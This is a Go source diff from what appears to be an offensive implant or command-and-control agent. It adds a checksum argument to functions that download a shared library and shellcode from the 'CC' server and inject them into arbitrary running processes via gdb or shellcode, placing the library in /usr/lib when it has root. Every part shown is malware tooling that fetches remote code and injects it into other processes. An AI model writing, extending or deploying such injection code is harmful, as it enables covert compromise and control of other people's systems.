@@ -22,7 +22,7 @@ import (
 func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
 	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
 	if !util.IsExist(gdb_path) {
-		res := VaccineHandler()
+		res := VaccineHandler("") // NOTE deprecated, won't work due to lack of gdb
 		if !strings.Contains(res, "success") {
 			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
 		}
@@ -77,7 +77,7 @@ func GDBInjectLoader(pid int) error {
 
 // Inject shared lib into any process
 func GDBInjectSharedLib(pid int) error {
-	so_path, err := prepare_shared_lib()
+	so_path, err := prepare_shared_lib("") // NOTE: deprecated, won't work due to lack of gdb
 	if err != nil {
 		return err
 	}
@@ -146,12 +146,12 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	return sc, nil
 }
 
-func prepare_shared_lib() (path string, err error) {
+func prepare_shared_lib(checksum string) (path string, err error) {
 	path = fmt.Sprintf("/usr/lib/%s", NameTheLibrary())
 	if !HasRoot() {
 		path = fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, NameTheLibrary())
 	}
-	_, err = SmartDownload("to_inject.so", path)
+	_, err = SmartDownload("to_inject.so", path, checksum)
 	if err != nil {
 		err = fmt.Errorf("Failed to download to_inject.so from CC: %v", err)
 	}
@@ -159,8 +159,8 @@ func prepare_shared_lib() (path string, err error) {
 }
 
 // prepare the shellcode
-func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
-	sc, err := SmartDownload("shellcode.txt", "")
+func prepare_sc(pid int, checksum string) (shellcode string, shellcodeLen int) {
+	sc, err := SmartDownload("shellcode.txt", "", checksum)
 	if err != nil {
 		log.Printf("Failed to download shellcode.txt from CC: %v", err)
 		// prepare guardian_shellcode
@@ -183,12 +183,12 @@ func prepare_sc(pid int) (shellcode string, shellcodeLen int) {
 }
 
 // InjectorHandler handles `injector` module
-func InjectorHandler(pid int, method string) (err error) {
+func InjectorHandler(pid int, method, checksum string) (err error) {
 	// dispatch
 	switch method {
 
 	case "shellcode":
-		shellcode, _ := prepare_sc(pid)
+		shellcode, _ := prepare_sc(pid, checksum)
 		if len(shellcode) == 0 {
 			return fmt.Errorf("failed to prepare shellcode")
 		}
@@ -198,7 +198,7 @@ func InjectorHandler(pid int, method string) (err error) {
 		}
 
 	case "shared_library":
-		so_path, e := prepare_shared_lib()
+		so_path, e := prepare_shared_lib(checksum)
 		if e != nil {
 			log.Printf("Injecting loader.so instead")
 			err = InjectLoader(pid)
